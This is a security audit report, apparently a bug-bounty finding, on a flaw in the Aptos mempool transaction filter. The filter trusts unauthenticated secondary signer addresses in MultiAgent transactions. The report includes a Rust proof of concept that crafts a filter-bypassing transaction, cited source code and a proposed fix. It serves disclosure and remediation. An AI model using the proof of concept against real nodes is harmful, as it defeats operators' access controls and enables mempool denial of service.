# Audit Report

## Title
MultiAgent Transaction Filter Bypass via Unauthenticated Secondary Signer Address Injection

## Summary
The transaction filter's `matches_transaction_authenticator_address()` function checks `secondary_signer_addresses` for address matching without verifying that corresponding valid authenticators exist. This allows attackers to bypass filter rules by injecting arbitrary addresses into `secondary_signer_addresses` without providing authentication, defeating the filter's access control purpose.

## Finding Description

The vulnerability exists in the transaction filtering logic that processes MultiAgent transactions before validation. The critical flaw occurs in the filter's address matching logic: [1](#0-0) 

The filter checks if an address is present in `secondary_signer_addresses` at line 507, but this field is **not yet validated** to have corresponding authenticators in `secondary_signers`. The validation flow is:

1. **Transaction Filter** (pre-validation): Checks `secondary_signer_addresses.contains(address)` [2](#0-1) 

2. **Signature Verification** (VM validation): Only verifies signatures present in `secondary_signers`, does not check length match [3](#0-2) 

3. **Prologue Validation** (execution): Finally checks length mismatch and rejects [4](#0-3) 

**Attack Scenario:**

A node operator configures an Allow filter: `Allow(AccountAddress(privileged_address))` to restrict mempool to only accept transactions involving privileged addresses. An attacker crafts:

```rust
SignedTransaction::new_multi_agent(
    raw_txn,
    valid_sender_authenticator,  // Properly signed
    vec![privileged_address],     // Injected without authentication
    vec![],                        // Empty - no authenticator provided
)
```

The transaction:
- **Passes the filter** (line 507 matches on `secondary_signer_addresses`)
- **Passes signature verification** (empty `secondary_signers` means no signatures to verify)
- **Enters mempool** consuming resources
- **Eventually rejected in prologue** with `PROLOGUE_ESECONDARY_KEYS_ADDRESSES_COUNT_MISMATCH`

This breaks the **Access Control** invariant: the filter's purpose as a pre-validation gatekeeper is defeated. The filter makes authorization decisions on unauthenticated, attacker-controlled data.

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos bug bounty program for the following reasons:

1. **Validator Node Resource Exhaustion**: Attackers bypass early filtering and force validators to perform expensive VM validation and prologue execution on invalid transactions. This directly maps to "Validator node slowdowns" in the High severity category.

2. **Access Control Bypass**: Deployment scenarios using filters for access control (private networks, rate limiting, address-based restrictions) can be completely bypassed. An attacker can impersonate any filtered address without authentication.

3. **Mempool DoS Vector**: By flooding with filter-bypassing invalid transactions, attackers can:
   - Consume mempool capacity meant for legitimate transactions
   - Trigger rate limits and backpressure mechanisms
   - Cause legitimate transaction drops

4. **Defense Mechanism Defeat**: The filter exists specifically to reject unwanted transactions BEFORE expensive operations. This vulnerability renders the filter ineffective for MultiAgent transactions, forcing all filtering logic to occur in later, more expensive stages.

The test suite even demonstrates this behavior is reachable: [5](#0-4) 

## Likelihood Explanation

**Likelihood: High**

- **Attack Complexity: Low** - Creating a MultiAgent transaction with mismatched addresses/authenticators requires no special privileges or cryptographic operations beyond normal transaction signing
- **Attacker Requirements: Minimal** - Any transaction sender can exploit this by constructing standard MultiAgent transactions
- **Detection: Difficult** - These transactions appear valid until prologue execution, making them hard to distinguish from legitimate transactions at the filter stage
- **Affected Deployments: Common** - Any node using transaction filters (documented feature) for access control or load management is vulnerable

The vulnerability is particularly concerning because:
1. Filters are a documented feature for production use
2. The attack leaves no special traces (just rejected transactions)
3. Multiple transactions can be sent rapidly to amplify impact
4. No special network position or validator access required

## Recommendation

**Fix: Validate address-authenticator correspondence in the filter**

The filter must verify that every address in `secondary_signer_addresses` has a corresponding entry in `secondary_signers` before making filtering decisions. Add this check to `matches_transaction_authenticator_address()`:

```rust
TransactionAuthenticator::MultiAgent {
    sender,
    secondary_signer_addresses,
    secondary_signers,
} => {
    // SECURITY FIX: Verify length match before checking addresses
    if secondary_signer_addresses.len() != secondary_signers.len() {
        return false; // Reject malformed transactions at filter stage
    }
    
    matches_account_authenticator_address(sender, address)
        || secondary_signer_addresses.contains(address)
        || secondary_signers
            .iter()
            .any(|signer| matches_account_authenticator_address(signer, address))
}
```

Apply the same fix to the FeePayer variant at lines 512-526.

**Alternative: Move filter after signature verification**

Restructure the mempool flow to apply filters after `check_signature()` completes, ensuring only cryptographically valid transactions are filtered. However, this reduces the filter's performance benefit.

## Proof of Concept

```rust
use aptos_crypto::ed25519::{Ed25519PrivateKey, Ed25519Signature};
use aptos_types::{
    account_address::AccountAddress,
    chain_id::ChainId,
    transaction::{
        authenticator::{AccountAuthenticator, TransactionAuthenticator},
        RawTransaction, Script, SignedTransaction, TransactionPayload,
    },
};
use aptos_transaction_filters::transaction_filter::{TransactionFilter, TransactionMatcher};
use rand::SeedableRng;

fn main() {
    // Setup: Node has Allow filter for privileged address only
    let privileged_address = AccountAddress::random();
    let filter = TransactionFilter::empty()
        .add_account_address_filter(true, privileged_address)
        .add_all_filter(false); // Deny all others
    
    // Attacker: Creates transaction with valid sender, but injects privileged_address
    // into secondary_signer_addresses WITHOUT providing authentication
    let attacker = AccountAddress::random();
    let mut rng = rand::rngs::StdRng::from_seed([0u8; 32]);
    let private_key = Ed25519PrivateKey::generate(&mut rng);
    
    let raw_txn = RawTransaction::new(
        attacker,
        0,
        TransactionPayload::Script(Script::new(vec![], vec![], vec![])),
        100000,
        1,
        100,
        ChainId::new(1),
    );
    
    // Sign only as sender, provide NO authentication for privileged_address
    let signature = private_key.sign(&raw_txn).unwrap();
    let sender_auth = AccountAuthenticator::Ed25519 {
        public_key: private_key.public_key(),
        signature,
    };
    
    // EXPLOIT: Inject privileged_address without corresponding authenticator
    let exploit_txn = SignedTransaction::new_multi_agent(
        raw_txn,
        sender_auth,
        vec![privileged_address], // INJECTED - not authenticated!
        vec![],                    // EMPTY - no authenticator provided
    );
    
    // VULNERABLE: Filter allows transaction based on unauthenticated address
    assert!(filter.allows_transaction(&exploit_txn));
    println!("âœ“ EXPLOIT: Filter bypassed! Transaction accepted despite no authentication for privileged_address");
    
    // Transaction will later fail in prologue with SECONDARY_KEYS_ADDRESSES_COUNT_MISMATCH
    // But filter's access control has already been defeated
}
```

**Expected Output:** The filter accepts the transaction even though the attacker provided no authentication for `privileged_address`, demonstrating complete bypass of address-based access control.

## Notes

The vulnerability stems from a fundamental design flaw: making authorization decisions on unvalidated, attacker-controlled data. While the transaction eventually fails in the prologue, the filter's purpose as an early rejection mechanism is completely defeated for MultiAgent transactions. This is particularly severe because filters are documented features intended for production deployments to manage load and implement access control policies.

### Citations

**File:** crates/aptos-transaction-filters/src/transaction_filter.rs (L493-531)
```rust
fn matches_transaction_authenticator_address(
    signed_transaction: &SignedTransaction,
    address: &AccountAddress,
) -> bool {
    // Match all variants explicitly to ensure future enum changes are caught during compilation
    match signed_transaction.authenticator_ref() {
        TransactionAuthenticator::Ed25519 { .. }
        | TransactionAuthenticator::MultiEd25519 { .. } => false,
        TransactionAuthenticator::MultiAgent {
            sender,
            secondary_signer_addresses,
            secondary_signers,
        } => {
            matches_account_authenticator_address(sender, address)
                || secondary_signer_addresses.contains(address)
                || secondary_signers
                    .iter()
                    .any(|signer| matches_account_authenticator_address(signer, address))
        },
        TransactionAuthenticator::FeePayer {
            sender,
            secondary_signer_addresses,
            secondary_signers,
            fee_payer_address,
            fee_payer_signer,
        } => {
            matches_account_authenticator_address(sender, address)
                || secondary_signer_addresses.contains(address)
                || secondary_signers
                    .iter()
                    .any(|signer| matches_account_authenticator_address(signer, address))
                || fee_payer_address == address
                || matches_account_authenticator_address(fee_payer_signer, address)
        },
        TransactionAuthenticator::SingleSender { sender } => {
            matches_account_authenticator_address(sender, address)
        },
    }
}
```

**File:** crates/aptos-transaction-filters/src/transaction_filter.rs (L709-721)
```rust
        let signed_transaction = SignedTransaction::new_multi_agent(
            raw_transaction.clone(),
            AccountAuthenticator::NoAccountAuthenticator,
            vec![
                AccountAddress::random(),
                target_address,
                AccountAddress::random(),
            ],
            vec![AccountAuthenticator::NoAccountAuthenticator],
        );

        // Verify that the authenticator matches the target address
        verify_matches_transaction_auth_address(&signed_transaction, &target_address, true);
```

**File:** mempool/src/shared_mempool/tasks.rs (L321-321)
```rust
        filter_transactions(&smp.transaction_filter_config, transactions, &mut statuses);
```

**File:** types/src/transaction/authenticator.rs (L225-239)
```rust
            Self::MultiAgent {
                sender,
                secondary_signer_addresses,
                secondary_signers,
            } => {
                let message = RawTransactionWithData::new_multi_agent(
                    raw_txn.clone(),
                    secondary_signer_addresses.clone(),
                );
                sender.verify(&message)?;
                for signer in secondary_signers {
                    signer.verify(&message)?;
                }
                Ok(())
            },
```

**File:** aptos-move/framework/aptos-framework/sources/transaction_validation.move (L385-389)
```text
        let num_secondary_signers = vector::length(&secondary_signer_addresses);
        assert!(
            vector::length(&secondary_signer_public_key_hashes) == num_secondary_signers,
            error::invalid_argument(PROLOGUE_ESECONDARY_KEYS_ADDRESSES_COUNT_MISMATCH),
        );
```
